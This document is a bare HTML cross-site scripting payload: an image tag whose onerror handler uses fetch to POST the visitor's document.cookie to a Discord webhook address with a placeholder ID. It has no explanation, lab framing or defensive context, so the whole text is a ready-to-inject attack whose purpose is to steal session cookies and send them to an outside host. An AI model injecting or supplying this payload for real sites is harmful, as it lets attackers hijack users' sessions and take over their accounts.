<img src="x" onerror="fetch('https://discord.com/api/webhooks/WEBHOOK_ID', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    content: document.cookie
  })
})">
